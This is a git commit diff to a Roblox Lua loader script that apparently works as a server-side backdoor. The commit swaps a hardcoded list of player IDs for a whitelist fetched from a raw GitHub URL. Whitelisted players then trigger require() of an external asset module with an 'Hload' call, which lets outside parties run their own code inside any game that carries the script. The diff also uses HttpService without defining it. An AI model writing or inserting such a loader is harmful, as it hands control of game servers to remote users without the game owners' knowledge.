bf855b3a50b639f79b0dc8fc704dae05dbd6e377
pwngd <126140186+pwngd@users.noreply.github.com>
2025-12-18 20:37:57 -0800

    Replace static whitelist with dynamic JSON fetch
    Refactor whitelist handling to fetch from JSON URL.

--- loader.lua
+++ loader.lua
@@ -1,18 +1,22 @@
+-- local WL = {
+--   [3227511162] = true;
+--   [119494759] = true;
+-- 	[31447] = true;
+-- 	[10162336255] = true;
+-- 	[1624879097] = true;
+-- 	[9560977192] = true;
+-- }
 local Players = game:GetService("Players")
-local WL = {
-  [3227511162] = true;
-  [119494759] = true;
-	[31447] = true;
-	[10162336255] = true;
-	[1624879097] = true;
-	[9560977192] = true;
-}
+local function getJson(url)
+	local response = HttpService:GetAsync(url)
+	return HttpService:JSONDecode(response)
+end
 local function onPlayer(player)
+	local WL = getJson("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/whitelist.json")
 	if WL[player.UserId] then
       -- require(7634392335)(player.Name)
 	  require(135231466738957):Hload(player.Name)
   	end
 end
-
 for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
 Players.PlayerAdded:Connect(onPlayer)
